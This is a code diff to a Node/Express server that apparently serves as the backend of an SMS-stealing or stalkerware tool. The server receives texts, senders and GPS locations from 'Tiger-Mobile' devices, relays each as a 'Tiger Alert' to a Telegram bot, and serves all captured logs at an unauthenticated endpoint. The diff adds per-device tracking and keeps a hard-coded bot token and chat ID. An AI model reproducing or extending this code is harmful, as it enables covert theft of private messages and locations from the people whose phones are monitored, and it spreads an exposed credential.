@@ -9,9 +9,9 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 // --- CONFIGURATION ---
-// Naya token aur ID
-const BOT_TOKEN = '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
-const CHAT_ID = '7128071523';
+// Use env vars in production. Fallback to hard-coded values for local dev (do not commit new secrets).
+const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8394719862:AAGdG06eMVj_Mz4hFCqv-jHrmyiSqsDXppk'; 
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7128071523';
 // ---------------------
 
 let smsLogs = [];
@@ -22,11 +22,12 @@ app.get('/admin', (req, res) => {
 
 app.post('/log-sms', async (req, res) => {
     try {
-        const { sender, message, device, timestamp, location } = req.body;
+        const { sender, message, device, deviceId, timestamp, location } = req.body;
         
         const newEntry = {
             id: Date.now(),
             device: device || 'Tiger-Mobile',
+            deviceId: deviceId || 'unknown',
             sender: sender || 'Unknown',
             message: message || 'No Content',
             time: timestamp || new Date().toLocaleString(),
@@ -42,11 +43,10 @@ app.post('/log-sms', async (req, res) => {
             : '\n📍 Location: Not Available';
 
         const telegramMsg = `🐯 *Tiger Alert!*\n\n` +
-                          `📱 *Device:* ${newEntry.device}\n` +
+                          `📱 *Device:* ${newEntry.device} (${newEntry.deviceId})\n` +
                           `👤 *From:* ${newEntry.sender}\n` +
                           `💬 *Message:* ${newEntry.message}\n` +
                           `⏰ *Time:* ${newEntry.time}` + mapUrl;
-
         console.log(`[Server] Sending to Telegram: ${telegramMsg}`);
         const telegramResponse = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
@@ -70,6 +70,10 @@ app.post('/log-sms', async (req, res) => {
 });
 
 app.get('/get-logs', (req, res) => {
+    const deviceId = req.query.deviceId;
+    if (deviceId) {
+      return res.json(smsLogs.filter(log => log.deviceId === deviceId));
+    }
     res.json(smsLogs);
 });
 
